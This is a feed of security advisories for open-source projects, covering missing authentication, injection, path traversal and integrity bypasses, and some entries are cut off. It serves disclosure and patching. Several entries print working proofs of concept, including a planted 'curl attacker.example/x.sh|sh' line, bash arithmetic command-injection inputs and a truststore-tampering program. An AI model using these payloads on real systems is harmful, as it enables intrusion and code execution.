entry.title: [github.com/reza-gholizade/k8s-mcp-server] k8s-mcp-server: Missing authentication on default SSE/HTTP transport allows unauthenticated Kubernetes tool execution
entry.content:
Summary

When k8s-mcp-server runs in its default SSE transport mode, the MCP tools/call endpoint is dispatched with no authentication, session token, or Origin check. Any client that can reach the listening port can enumerate and invoke the server's Kubernetes tools (including destructive/write tools) without credentials, executing with the server's configured cluster privileges.

Affected

Commit be87a6dd72bb6ec1d4886b8548843b99a4638b12 (Merge PR #130) MCP library: github.com/mark3labs/mcp-go v0.57.0 Default mode: sse (SERVER_MODE default), default port 8080, bind 0.0.0.0

Root cause (static trace: handleSSE -> handleMessage -> tools/call)

  • main.go L129: server.NewSSEServer(s) is created with no auth option and no contextFunc; L130 sse.Start(":"+port) binds all interfaces (0.0.0.0).
  • mcp-go sse.go handleSSE (GET /sse): no auth header check; the server mints a sessionId for any caller. The sessionId is a correlation value, not a credential.
  • handleMessage (POST /message): the only gates are method==POST and a loadable sessionId. No Authorization/Bearer/token/Origin/CSRF check before s.server.HandleMessage(ctx, rawMessage) dispatches to the tools/call handler.
  • Only Access-Control-Allow-Origin: * is present (CORS relaxation, not auth). Write tools (Create/Delete/RolloutRestart, Helm Install/Upgrade/Uninstall/Rollback) are all registered unless -read-only is set (default readOnly=false).

Runtime reproduction (no auth headers on any request)

Started: k8s-mcp-server -mode sse -port 8080 with a dummy non-routable KUBERNETES_SERVER=https://127.0.0.1:1 (no real cluster touched).

GET /sse -> HTTP 200; server mints /message?sessionId=93b3... POST /message initialize -> HTTP 202; result returned over SSE POST /message tools/list -> HTTP 202; FULL tool list returned (incl. destructive) POST /message tools/call getAPIResources -> HTTP 202; handler EXECUTED: error -32603 "... Get https://127.0.0.1:1/api...: dial tcp 127.0.0.1:1: connect"

The tools/call response is NOT HTTP 401/403 but an in-handler cluster-connection error, proving the RPC passed any authorization gate and reached the getAPIResources handler. With a valid kubeconfig, the same path returns real cluster data. ss -ltnp confirms LISTEN *:8080 (all interfaces, externally exposed).

Impact

An unauthenticated attacker with network reach to the port can enumerate tools and invoke Kubernetes operations with the server's privileges — cluster read and, with default readOnly=false, state-changing operations (Create/Delete/Helm). CWE-306 (Missing Authentication for Critical Function).

Why this is a defect, not by-design

Default mode is HTTP (sse) on 0.0.0.0:8080, containerized deployment is the normal scenario, and there is no "trusted client only" / auth-required note in the docs. MCP HTTP transports are expected to be loopback-only or gated; this one is neither.

Suggested fix

  • Add an authorization gate before tools/call on the HTTP transports: e.g. WithSSEContextFunc to validate an Authorization bearer/token, or fail-closed when no token is configured in HTTP mode.
  • Default the bind to 127.0.0.1 and require explicit opt-in for external binding.
  • Document that HTTP mode must sit behind an authenticating proxy; recommend STDIO by default.

Reproduction was done against the actual built binary and the shipped SSE path (not an extract).

Credit

entry.title: [github.com/containerd/containerd/v2] containerd image-triggered daemon crash via malformed digest in subject-annotated descriptor
entry.content:
Impact

A bug in containerd's image manifest processing causes an unrecovered panic when a child descriptor contains the io.containerd.manifest.subject annotation and a malformed digest. Pulling or importing such an image through the transfer service (including default CRI PullImage requests) crashes the containerd daemon. In Kubernetes environments, kubelet retries failed image pulls with backoff, allowing a pod referencing an untrusted image to repeatedly crash containerd and disrupt container operations on the worker node.

Patches

This bug has been fixed in containerd 2.4.2, 2.3.7, and 2.2.10. Users should update to these versions to resolve the issue.

Workarounds

Restrict pod image references to trusted registries (for example, using a Kubernetes ValidatingAdmissionPolicy or admission webhook) and only pull or import images from trusted sources.

The containerd project would like to thank @melihgurlek, LEI WANG (@ssst0n3) and Haoyuan Zhang (@zj1ng7), and OpenSec Intelligence who independently discovered and responsibly disclosed this issue in accordance with the containerd security policy.

entry.title: [github.com/junegunn/fzf] fzf: Predictable FIFO path in zsh completion allows local symlink attack / arbitrary file overwrite as the victim user (_fzf_feed_fifo)
entry.content:
Summary

shell/completion.zsh feeds every trigger-driven zsh completion through a FIFO at a predictable, PID-based path in shared /tmp (fzf-complete-fifo-$$), without checking the failure of rm -f/mkfifo. On a multi-user host, another local user can pre-create that path as a symlink to a victim-writable file (e.g. ~/.bashrc), causing the victim's own completion to overwrite it with the completion stream — with attacker-influenced content (e.g. via process names in ps output), escalating to code execution at the victim's next login. A pre-created plain FIFO instead leaks/blocks on the completion stream.

Reporter / Credits:

Sai Sreewathsa Kovalluri, Shon Babu and Kannan K (Researchers), Innspark Solutions https://innspark.in/

Details

shell/completion.zsh (tag 0.74.4, commit a140afeb):

  • line ~246: fifo="${TMPDIR:-/tmp}/fzf-complete-fifo-$$" — predictable name; shell PIDs are low/guessable and a wide range can be pre-created.
  • lines 216-220, verbatim:
_fzf_feed_fifo() {
  command rm -f "$1"     # fails (EPERM) on an attacker-owned entry in sticky /tmp — error ignored
  mkfifo "$1"            # fails (EEXIST) — exit status unchecked
  cat <&0 > "$1" &|      # follows the attacker symlink / blocks on the attacker FIFO
}

Attack modes (no race required):

  1. File clobber → code execution: > "$1" follows a pre-created symlink, truncating/overwriting a victim-writable file with the completion input stream using the victim's privileges. For kill-completion the stream includes attacker-influenced process names, so planted lines can land in the victim's startup file.
  2. Information leak / hang: a pre-created plain FIFO makes the victim's cat block until the attacker reads the stream (full ps output, host lists, variable names).

PoC

Mechanism verified with the function extracted byte-for-byte from shell/completion.zsh (only &| → &, a syntax port irrelevant to the flaw), reproducing the cross-user /tmp precondition via an entry the victim cannot remove (identical to sticky /tmp semantics for an attacker-owned entry):

rm: cannot remove '.../fzf-complete-fifo-4242': Permission denied
mkfifo: cannot create fifo '.../fzf-complete-fifo-4242': File exists

=== victim file AFTER the victim's completion ran ===
evil-process; curl attacker.example/x.sh|sh; :
other-stream-data

The file was overwritten despite both rm and mkfifo failing. A self-contained reproducer was provided by email (poc-t04-fifo-clobber.sh).

Impact

Local (multi-user host; CWE-377 / CWE-59). Any victim running zsh with fzf trigger completion (kill/ssh/telnet/export/unset/unalias **<TAB>) on a host shared with an attacker risks silent overwrite of arbitrary user files (→ code execution at next login) or disclosure of the completion stream. Suggested fix: create the FIFO inside a private mktemp -d directory (mode 700) and check mkfifo's exit status, removing the rm-then-mkfifo TOCTOU entirely.

Reported privately to the maintainer by email; fix prepared for the next release.

Exploitability in practice

On a default modern host the file-overwrite variant is blocked by fs.protected_symlinks (a process will not follow a symlink in a sticky, world-writable directory owned by another user), and protected_fifos/protected_regular further limit the FIFO variants. Exploitation therefore depends on these kernel protections being disabled. The information exposed is a bounded completion candidate list (process names, hostnames, variable names) rather than arbitrary data, and the "code execution at next login" outcome is a downstream chain requiring the victim to both have the clobbered file sourced and log in again.

References

  • https://github.com/junegunn/fzf/security/advisories/GHSA-7rj6-7pqx-v7rm
  • https://nvd.nist.gov/vuln/detail/CVE-2026-121717
  • https://github.com/junegunn/fzf/commit/cbc11e4d9591e1fa47fb9d8711b18b74d625746e
  • https://github.com/junegunn/fzf/releases/tag/v0.74.5
  • https://github.com/advisories/GHSA-7rj6-7pqx-v7rm

entry.title: [github.com/junegunn/fzf] fzf: Arbitrary command execution via bash arithmetic expansion on unvalidated layout size in fzf-tmux (-l/-u attached value)
entry.content:
Summary

bin/fzf-tmux fails to validate layout size values given in the attached form (e.g. -l50). For -l/-u these values reach bash arithmetic expansion ($(( max - size ))), where an operand like a[$(cmd)] executes cmd as the invoking user during option parsing — before any tmux interaction and even outside tmux. A second sink embeds unvalidated popup geometry (-x/-y/-w/-h/-p) into an unquoted tmux popup ... $opt ... invocation, allowing injection of tmux flags such as -e BASH_ENV=<path> (command execution via non-interactive bash sourcing $BASH_ENV).

Reporter / Credits:

Sai Sreewathsa Kovalluri, Shon Babu and Kannan K (Researchers), Innspark Solutions https://innspark.in/

Details

In bin/fzf-tmux (tag 0.74.4, commit a140afeb), the option parser validates size values with a regex (^[0-9%,]+$ / ^[A-Z]$) only for the separate-argument form (line 82). The attached form is captured unvalidated at line 80:

if [[ ${#arg} -gt 2 ]]; then
  size="${arg:2}"                       # no validation
else
  if [[ $1 =~ ^[0-9%,]+$ ]] || [[ $1 =~ ^[A-Z]$ ]]; then   # only separate form validated

For -l and -u, swap is non-empty (lines 68/75), so size reaches arithmetic evaluation:

  • line 120: size=$((max - size)) (non-percent values)
  • line 102: opt="$opt -l $((100 - size))%" (percent, tmux >= 3.2)
  • line 108: opt="$opt -p $((100 - size))" (percent, tmux < 3.2)

Bash arithmetic expands array subscripts, so a[$(command)] runs command. Verified end-to-end against the unmodified script (see PoC).

Second sink (same root cause): opt is used unquoted at line 236 (tmux popup -d "$PWD" $opt "bash $argsf") and line 249, so a geometry value containing spaces injects extra tmux flags, e.g. -e BASH_ENV=/path/to/script.

PoC

Verified on 0.74.4 (no tmux or fzf binary needed — a stub fzf on PATH suffices because the sink fires during bash argument parsing):

$ bash bin/fzf-tmux '-l a[$(id > /tmp/pwn1)]'      # line 120 sink (non-percent)
$ bash bin/fzf-tmux '-u a[$(id > /tmp/pwn2)]%'     # line 102/108 sink (percent)

$ cat /tmp/pwn1 /tmp/pwn2
uid=1001(sb) gid=1001(sb) groups=...
uid=1001(sb) gid=1001(sb) groups=...

A self-contained reproducer was provided by email (poc-t03-arithmetic.sh). Popup flag-injection variant (tmux >= 3.2): bash bin/fzf-tmux -p '-x0 -e BASH_ENV=/path/to/evil.sh'.

Impact

Local command injection (CWE-78). fzf-tmux argv is commonly assembled by third-party scripts and editor plugins (e.g. fzf-tmux -l "${height}%"); any layout value influenced by less-trusted data (project-local config, wrapper scripts) yields arbitrary command execution as the invoking user. Suggested fixes: apply the regex validation to the attached form, constrain size to [0-9]+ before any $((...)), and build the tmux invocation as an array ("${opt_parts[@]}") instead of unquoted $opt.

Reported privately to the maintainer by email; fixes prepared for the next release.

Exploitability in practice

Impact is high (command execution as the invoking user), but a real attack requires attacker-controlled data to reach the fzf-tmux layout arguments (-l/-u). In normal use these values are set by the user or by trusted, hardcoded configuration, so a vulnerable data flow is uncommon. The issue is local-only, requires the victim to run fzf-tmux with the poisoned value, and bin/fzf-tmux has been superseded by the built-in --tmux/--popup option since 0.53.0.

References

  • https://nvd.nist.gov/vuln/detail/CVE-2026-121716
  • https://github.com/junegunn/fzf/commit/f126ff29549e0983f571fbc32dddcfbede251aa7

entry.title: [github.com/StacklokLabs/sqlite-mcp] sqlite-mcp: Read-only mode bypass via statement chaining and SQL injection in describe_table
entry.content:
Summary

In read-only mode (the default), a client that can call the MCP tools can write to the database the server is meant to expose read-only, read other SQLite files, and create new SQLite files anywhere the server process can write. There are two ways in: statement chaining through execute_query, and SQL injection through describe_table.

Details

  • Statement chaining in execute_query. The only check was that the query starts with SELECT. The modernc.org/sqlite driver runs every ;-separated statement in one call, so anything after SELECT 1; ran unchecked.
  • SQL injection in describe_table. The table_name argument was interpolated into PRAGMA table_info(%s) with no guard.
  • Escaping read-only mode. Through either path, ATTACH DATABASE opens a file read-write regardless of the main connection's mode=ro. Attaching the protected database itself made it writable. Attaching another path read that file, or created it if it did not exist.

Read-write mode is not affected beyond its intended capabilities, apart from ATTACH reaching files other than the configured database.

Impact

  • Modify the database that read-only mode is meant to protect.
  • Read any SQLite database file the server process can read.
  • Create new SQLite-format files anywhere the server process can write, or write to existing SQLite or empty files. Existing non-empty files that are not SQLite databases are refused and left unchanged.

The server has no built-in authentication and, by default, listens on :8080 on all interfaces. Unless it is deployed behind an authenticating proxy, anyone who can reach that port can exploit this.

Patches

Fixed in v0.1.2:

  • ATTACH is disabled in the engine (SQLITE_LIMIT_ATTACHED set to 0) on every connection that runs a statement.
  • Read-only connections set query_only.
  • execute_query rejects input that contains more than one statement.
  • describe_table passes the table name as a bound parameter.

Workarounds

Upgrade to v0.1.2. If you cannot upgrade, don't expose the server to untrusted clients: keep it on a loopback or private interface, or run it behind an authenticating proxy such as ToolHive. Mount only the database you intend to expose, read-only at the filesystem or container level.

Credits

Reported by @bebold6133.

entry.title: [github.com/russellhaering/gosaml2] gosaml2: Unauthenticated panic decrypting an EncryptedAssertion with a short or empty CipherValue
entry.content:
Summary

An attacker who can supply a crafted SAML Response for parsing can crash a gosaml2 service provider by sending an EncryptedAssertion with AES-GCM encryption metadata and a CipherValue shorter than the GCM nonce size (12 bytes). The library panics with slice bounds out of range before any validation completes.

This is a distinct issue from GHSA-hwqm-qvj9-4jr2, which addressed panics in the AES-CBC decryption path (commit 3418f9ae09063ff8df0ce1bd93f24e538e614def, included in v0.10.0). That fix added a block-size check for CBC but left the AES-GCM path completely unprotected.

Details

ValidateEncodedResponse() decrypts EncryptedAssertion nodes before signature or content validation completes. There are two call sites:

  1. Signed Response branch -- decode_response.go#L341
  2. Unsigned Response branch -- decode_response.go#L388

Both call decryptAssertions() (decode_response.go#L150-L200), which calls EncryptedAssertion.DecryptBytes() at decode_response.go#L176.

Inside DecryptBytes() (types/encrypted_assertion.go#L34-L92), the AES-GCM branch (line 53, case MethodAES128GCM, MethodAES192GCM, MethodAES256GCM:) slices the decoded ciphertext without checking its length at line 59:

nonce, data := data[:c.NonceSize()], data[c.NonceSize():]

If CipherValue decodes to fewer than 12 bytes (GCM nonce size), Go panics with slice bounds out of range. All three GCM key sizes (AES-128-GCM, AES-192-GCM, AES-256-GCM) share the same vulnerable branch.

Comparison with the patched CBC path: The CBC branch (lines 65-88 of the same file) correctly checks len(data) % k.BlockSize() != 0 before slicing -- this was the fix for GHSA-hwqm-qvj9-4jr2. The GCM branch has no equivalent guard.

The attacker only needs the SP's public certificate (typically available in SAML metadata) to wrap a symmetric key via RSA-OAEP. The CipherValue for the assertion body can be left empty. No valid signature is required.

PoC

Test environment:

  • Apple M4 (arm64)
  • Go 1.26.1
  • gosaml2 v0.11.0 (commit 636e7dda202a4d669644e72404a82616ffcbe004)

Self-contained reproduction:

package main

import (
    "crypto/rand"
    "crypto/rsa"
    "crypto/sha1"
    "crypto/tls"
    "crypto/x509"
    "crypto/x509/pkix"
    "encoding/base64"
    "fmt"
    "math/big"
    "os"
    "time"

    saml2 "github.com/russellhaering/gosaml2"
    dsig "github.com/russellhaering/goxmldsig"
)

func main() {
    // Generate a throwaway SP key pair.
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
    tmpl := &x509.Certificate{
        SerialNumber: big.NewInt(1),
        Subject:      pkix.Name{CommonName: "sp.example"},
        NotBefore:    time.Now().Add(-time.Hour),
        NotAfter:     time.Now().Add(time.Hour),
    }
    certDER, _ := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
    cert := tls.Certificate{
        Certificate: [][]byte{certDER},
        PrivateKey:  key,
    }

    // Wrap an attacker-chosen symmetric key with the SP's public cert.
    symKey := make([]byte, 16)
    wrappedKey, _ := rsa.EncryptOAEP(sha1.New(), rand.Reader, &key.PublicKey, symKey, nil)

    responseXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    Version="2.0" ID="_id" IssueInstant="2026-03-19T00:00:00Z">
  <saml2:Issuer>issuer.example</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>

entry.title: [github.com/zzet/gortex] Gortex: Arbitrary file write / repo-confinement escape in `write_file` / `edit_file` / `move_inline` MCP tools → code execution
entry.content:
Summary

Gortex is an MCP server exposing write_file, edit_file, and move_inline tools. resolveFilePath exempts absolute paths from confinement, and the write handlers — unlike read_file / get_symbol_source — never call guardSymlinkWithinRepo. A single MCP write_file call with an absolute path writes any file the daemon user can, outside every indexed repo root (AtomicWriteFile's MkdirAll auto-creates missing parents). Writing ~/.zshrc, ~/.bashrc, .git/hooks/pre-commit, or a cron/systemd unit yields code execution on the next shell/commit. This directly violates the project's own SECURITY.md invariant "File-path resolution is confined to indexed repository roots"

Affected

internal/mcp/tools_fileops.go (+ tools_move_inline.go), HEAD 28fa017 (v0.53.0). CWE-22 (Path Traversal) / CWE-73 (External Control of File Name/Path) → CWE-94 (code execution).

Vulnerable code

internal/mcp/tools_fileops.go:54-62 resolveFilePath exempts absolute paths from the repo-root confinement; the write sink at :793 (AtomicWriteFile, write_file) and :676 (edit_file) run with no guardSymlinkWithinRepo. The asymmetry is the bug: read_file (:940) and get_symbol_source do call guardSymlinkWithinRepo; the write path does not.

PoC (executed)

The PoC (internal/mcp/poc_arbitrary_write_test.go, package mcp) builds the server via the repo's own newSingleRepoServer(t) harness and invokes the real srv.handleWriteFile through the genuine mcplib.CallToolRequest shape:

=== RUN   TestPoC_ArbitraryWrite_AbsolutePathEscapesEveryRepoRoot
  indexed repo root (confinement boundary): /var/folders/.../myrepo
  handler status=created path=/var/folders/.../003/pwn.txt bytes_written=50
  PROOF: /var/folders/.../003/pwn.txt now exists with attacker bytes "OWNED-by-gortex-write_file-outside-every-repo-root"
  RCE-PATH PROOF: wrote /var/folders/.../004/victim-home/.zshrc (parent dir auto-created) -> "echo PWNED_BY_GORTEX_RCE # injected via write_file"
  VIOLATION of SECURITY.md line 17 ("It does not write to source files")
--- PASS  (go test ok)

The test asserts the handler did not return IsError and that the files exist outside every repo root. (Full PoC available on request.)

Impact

write_file / edit_file are MCP tools driven by an LLM agent. A prompt-injected or adversarial agent (the standard MCP threat model) writes any file the daemon user can — startup/hook/cron files → arbitrary code execution on the host running the daemon. Confinement (the security property SECURITY.md promises) is broken on the write path.

Severity

High — CVSS v3.1 AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N ≈ 8.x. UI:R reflects that a tool call must be elicited from the agent (standard MCP injected-tool model). The RCE is a chain (write a startup/hook file → execute on next trigger), so I:H + the code-execution path. Floor: if the deployment never exposes write tools to untrusted input, impact is lower — but the tool is shipped and the confinement guard is simply absent on the write path.

Remediation

Apply guardSymlinkWithinRepo (and reject absolute paths outside the indexed roots) on write_file / edit_file / move_inline, identically to read_file / get_symbol_source. Confinement must cover the write path.

entry.title: [github.com/pavel-v-chernykh/keystore-go/v3] keystore-go: Keystore integrity and password verification bypass via stripped trailing digest in Decode()
entry.content:
Summary

keystore.Decode() fails to check the error returned when reading the trailing SHA-1 integrity digest of a JKS keystore. If an attacker removes the final 20 bytes from a .jks file, the digest read returns an empty slice and the byte-comparison loop never executes, so Decode() returns the parsed keystore with err == nil. This defeats both tamper detection and — for certificate-only truststores — the password check itself, allowing an attacker with write access to a keystore file (but without knowledge of the keystore password) to silently inject or replace trusted CA certificates.

Details

Affected versions: github.com/pavel-v-chernykh/keystore-go ≤ v2.1.0+incompatible (the final release on this module path). v3 and v4 releases are not impacted.

In decoder.go, function Decode, lines 264-272:

computedDigest := ksd.md.Sum(nil)
actualDigest, err := ksd.readBytes(uint32(ksd.md.Size()))
for i := 0; i < len(actualDigest); i++ {
    if actualDigest[i] != computedDigest[i] {
        return nil, ErrInvalidDigest
    }
}

return keyStore, nil

Two defects combine here:

  1. The err returned by ksd.readBytes(20) on line 265 is assigned but never inspected.
  2. The comparison loop on line 266 is bounded by len(actualDigest) rather than len(computedDigest).

readBytes (decoder.go lines 75-94) reads the requested bytes via io.ReadFull; on EOF/short read it returns (nil, ErrIo):

_, err := io.ReadFull(ksd.r, ksd.b[:blockSize])
if err != nil {
    return result, ErrIo
}

When the trailing 20-byte digest is absent from the input stream, actualDigest is therefore nil, len(actualDigest) == 0, the for loop body never executes, and Decode() falls through to return keyStore, nil.

The JKS format's only integrity guarantee is this trailing SHA1(passwordBytes || "Mighty Aphrodite" || body) digest. For truststores containing only TrustedCertificateEntry values it is also the only place the password is verified. Consequently:

  • An attacker who can modify a .jks truststore on disk — but does not know the keystore password — can replace or add trusted CA certificates, drop the last 20 bytes of the file, and the consuming Go process will load the forged truststore as valid.
  • After the digest is stripped, Decode() accepts any password, so operators who believe the password gates integrity receive no error even when the wrong password is supplied.

The reference Java JavaKeyStore implementation reads the digest with DataInputStream.readFully and throws on short read; this Go port diverges from that behaviour.

PoC

go mod init poc
go get github.com/pavel-v-chernykh/keystore-go@v2.1.0+incompatible
go run .

package main

import (
        "bytes"
        "fmt"
        "os"

        keystore "github.com/pavel-v-chernykh/keystore-go"
)

func main() {
        originalCert := []byte("ORIGINAL-TRUSTED-CA-CERTIFICATE")
        evilCert := []byte("EVIL-ATTACKER-CA-CERTIFICATE!!!") // same length

        ks := keystore.KeyStore{
                "trusted-ca": &keystore.TrustedCertificateEntry{
                        Certificate: keystore.Certificate{
                                Type:    "X509",
                                Content: originalCert,
                        },
                },
        }

        var buf bytes.Buffer
        if err := keystore.Encode(&buf, ks, []byte("correct-password")); err != nil {
                panic(err)
        }
        legit := buf.Bytes()
        fmt.Printf("[*] Legitimate keystore: %d bytes (last 20 = SHA-1 digest)\n", len(legit))

        // Sanity: untampered keystore with WRONG password is rejected.
        _, err := keystore.Decode(bytes.NewReader(legit), []byte("wrong-password"))
        fmt.Printf("[*] Decode(legit, wrong-password) -> err=%v  (expected ErrInvalidDigest)\n", err)

        // Attacker: tamper with the certificate, then strip the 20-byte digest.
        tampered := bytes.Replace(append([]byte(nil), legit...), originalCert, evilCert, 1)
        tampered = tampered[:len(tampered)-20] // remove trailing SHA-1 digest entirely

        // 1) Tampered keystore + CORRECT password: integrity check should fail.
        out, err := keystore.Decode(bytes.NewReader(tampered), []byte("correct-password"))
        if err == nil {
                entry := out["trusted-ca"].(*keystore.TrustedCertificateEntry)
                fmt.Printf("\n[BYPASS] Tampered keystore accepted with correct password.\n")
                fmt.Printf("         Trusted cert content: %q\n", entry.Certificate.Content)
        } else {
                fmt.Printf("[ok] tampered keystore rejected: %v\n", err)
                os.Exit(1)
        }

        // 2) Tampered keystore + WRONG password: should also fail.
        out2, err2 := keystore.Decode(bytes.NewReader(tampered), []byte("attacker-does-not-know"))
        if err2 == nil {
                entry := out2["trusted-ca"].(*keystore.TrustedCertificateEntry)
                fmt.Printf("[BYPASS] Tampered keystore accepted with WRONG password.\n")
                fmt.Printf("         Trusted cert content: %q\n", entry.Certificate.Content)
        } else {
                fmt.Printf("[ok] wrong password rejected: %v\n", err2)
                os.Exit(1)
        }
}

Expected output:

[*] Legitimate keystore: 97 bytes (last 20 = SHA-1 digest)
[*] Decode(legit, wrong-password) -> err=keystore: invalid digest  (expected ErrInvalidDigest)

[BYPASS] Tampered keystore accepted with correct password.
         Trusted cert content: "EVIL-ATTACKER-CA-CERTIFICATE!!!"
[BYPASS] Tampered keystore accepted with WRONG password.
         Trusted cert content: "EVIL-ATTACKER-CA-CERTIFICATE!!!"

Impact

Any application that uses keystore.Decode() to load a JKS truststore and relies on the keystore password for tamper evidence is affected. An attacker who can write to the .jks file (local user, compromised deployment artefact, writable config volume, etc.) but does not know the keystore password can replace trusted CA certificates undetected. Downstream, this typically enables man-in-the-middle interception of TLS connections that trust the forged CA, compromising confidentiality and integrity of those connections. No authentication to the target application is required beyond file-write access; no user interaction is required.

This defect was fixed in commit af93effd832cf1aef7794e69c31e1b668e17b851 (2019-09-16, "Update to go1.13"), which added an if err != nil { return … } guard after reading the trailing digest and replaced the length-of-actual loop with a full-length bytes.Compare(actualDigest, computedDigest). That commit first shipped in tag v3.0.0. There is no fixed release on the bare github.com/pavel-v-chernykh/keystore-go module path — every release there (v1.0.0 through v2.1.0+incompatible) predates the fix. The fixed code is available under the successor module paths:

  • github.com/pavel-v-chernykh/keystore-go/v3 ≥ v3.0.0
  • github.com/pavel-v-chernykh/keystore-go/v4 ≥ v4.0.0
  • github.com/pavlo-v-chernykh/keystore-go/v4 ≥ v4.0.0 (repository renamed at v4.4.0; the Go module proxy serves all v4.x under both spellings)

Users of the legacy v2 module path remain exposed and should migrate to github.com/pavlo-v-chernykh/keystore-go/v4.

  • https://nvd.nist.gov/vuln/detail/CVE-2026-76101

entry.title: [github.com/nats-io/nats-server/v2] NATS Server MQTT subscribe permission bypass exposes internal QoS 2 metadata
entry.content:
Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server MQTT support uses internal $MQTT.* subjects to implement MQTT protocol features such as QoS handling.

Problem Description

An authenticated MQTT client could subscribe to an internal MQTT delivery subject that was not intended to be available to clients.

This bypassed configured subscribe permissions for that internal subject family and exposed MQTT QoS2 protocol metadata for sessions in the account. Message payloads were not exposed through this path.

This issue was related to an incomplete restriction on internal MQTT subjects. It affected MQTT users whose ordinary subscribe permissions would not otherwise allow access to those internal subjects.

Affected Versions

Versions v2.14.2, v2.12.7 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.8.

Workarounds

No known workaround for deployments that require MQTT. Upgrade to a fixed release. Deployments not using MQTT are not affected.

Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports MQTT clients and can bridge MQTT activity into NATS subjects across routes and leafnode connections.

Problem Description

An MQTT client could include protocol control characters in subscription filters that were later forwarded as NATS protocol data to route or leafnode connections.

This could corrupt the forwarded protocol stream and allow injection of unintended NATS protocol operations, potentially across cluster nodes or accounts where route or gateway connections are present.

Anonymous MQTT deployments are higher risk because no credentials are required to reach the affected parser. Authenticated deployments are still affected for clients allowed to create MQTT subscriptions.

Disable anonymous MQTT access where it is not required. Deployments that need MQTT have no known complete workaround other than upgrading.

entry.title: [miren.dev/runtime] Miren Runtime: Authentication bypass in RPC layer: unverified TLS client certificates grant cluster superuser access
entry.content:
Summary

The Miren Runtime RPC server (QUIC/HTTP3, default port :8443) requested TLS client certificates but never verified that a presented certificate chained to the cluster Certificate Authority. Because a client-certificate identity is granted a blanket RBAC bypass, any party able to reach the RPC listener could present a forged, self-signed certificate and be authenticated as a cluster superuser — no valid CA signature, credential, or prior authorization required.

Impact

This is a complete, unauthenticated authentication bypass against the cluster control plane. An attacker who can reach the RPC port can perform any RPC operation with full privileges: enumerate and manipulate entities, apps, sandboxes, disks, and other cluster resources. This yields full compromise of confidentiality, integrity, and availability of the cluster and everything it orchestrates.

Exposure is network-reachability–gated only. Deployments that expose :8443 beyond a trusted network (e.g. 0.0.0.0/0) are remotely exploitable from the internet by anyone; deployments that restrict :8443 to a trusted network are exploitable by any party with access to that network.

Due to a lack of ability to detect if the RPC has been accessed unauthorized, Miren recommends that all applications are redeployed and any credentials reference in environment variables are rotated. A read-only script to help review standing access, recent changes, and the exact secrets to rotate is available at https://github.com/mirendev/runtime/tree/089582a132f7fc1e1d5b5c0aee1e0911535fed53/scripts/security/audit-exposure.

Details

Three independent factors combined to produce the bypass:

  1. The listener never verified the client-certificate chain. When a cluster CA was configured, the RPC listener used tls.RequestClientCert, which requests a client certificate but does not verify it against the configured ClientCAs. tls.ConnectionState.VerifiedChains was therefore always empty, and no VerifyPeerCertificate/VerifyConnection hook re-checked the chain.

  2. The authenticator derived identity from an unverified certificate. The RPC authenticators read PeerCertificates[0].Subject.CommonName directly as the caller identity, with method cert, without checking that the chain had been verified.

  3. Authorization granted a blanket bypass to certificate identities. The authorizer returned "allowed" for any cert-method identity, skipping all RBAC checks.

Go's TLS client only presents a certificate whose issuer Distinguished Name matches a CA advertised by the server, but that comparison is on the (public, non-secret) DN bytes only — it does not require a valid signature from the CA. An attacker can therefore mint a self-signed certificate whose issuer DN is byte-identical to the cluster CA subject, signed with an attacker-controlled key. The stock client presents it, and the vulnerable server accepts it and trusts its CommonName as a superuser identity.

Patches

Fixed by verifying the client-certificate chain before trusting it:

  • The listener now uses tls.VerifyClientCertIfGiven when a cluster CA is configured. A presented certificate must chain to the configured CA to complete the handshake, while certless callers (JWT/OIDC, which authenticate via the Authorization header) are still admitted.
  • As defense in depth, both RPC authenticators now require a non-empty VerifiedChains before deriving an identity from a client certificate.

Users should upgrade to the patched release and restart the server so the new listener configuration takes effect.

Workarounds

Until the patch is deployed, restrict network access to the RPC port (:8443) so that it is not reachable from untrusted networks — remove any 0.0.0.0/0 ingress and limit it to trusted management networks. This is a containment measure only and does not remove the underlying vulnerability.

entry.title: [github.com/OliveTin/OliveTin] OliveTin: Second-Order OS Command Injection via shellAfterCompleted
entry.content:
Summary

OliveTin's shellAfterCompleted post-execution hook injects unsanitized variables — including arbitrary command output (output), the authenticated username (ot_username), and the exit code (exitCode) — directly into a shell command template processed by sh -c. Unlike the main action's argument handling, no checkShellArgumentSafety validation is applied to these variables. An attacker who can influence the output of a command (e.g., via user-supplied arguments that reflect in stdout, or through trusted-header username spoofing) can inject arbitrary OS commands into the post-execution shell.

This is a distinct finding from CVE-2026-27626 (OS command injection via password type in webhooks). That CVE addressed argument types bypassing shell safety checks in the primary execution step. This vulnerability exists in the post-execution step (stepExecAfter), which has zero safety checks on any of its template variables.

Affected Versions

  • All versions containing shellAfterCompleted functionality (current codebase through latest)

Details

Vulnerable Code Path

In service/internal/executor/executor.go, the stepExecAfter function handles post-execution commands:

func stepExecAfter(req *ExecutionRequest) bool {
    if req.Binding.Action.ShellAfterCompleted == "" {
        return true
    }

    // These variables are injected WITHOUT any type checking or sanitization
    args := map[string]string{
        "output":                 req.logEntry.Output,           // Arbitrary command stdout/stderr
        "exitCode":               fmt.Sprintf("%v", req.logEntry.ExitCode),
        "ot_executionTrackingId": req.TrackingID,
        "ot_username":            req.AuthenticatedUser.Username, // User-controlled via trusted headers
    }

    // Template rendered with unsanitized args
    finalParsedCommand, err := tpl.ParseTemplateWithActionContext(
        req.Binding.Action.ShellAfterCompleted,
        req.Binding.Entity,
        args,
    )

    // Directly passed to sh -c — NO safety check
    cmd := wrapCommandInShell(ctx, finalParsedCommand)
    // ...
}

The wrapCommandInShell function (in executor_unix.go) executes:

func wrapCommandInShell(ctx *ExecutionContext, finalParsedCommand string) *exec.Cmd {
    return exec.CommandContext(ctx, "sh", "-c", finalParsedCommand)
}

Why This Bypasses Existing Protections

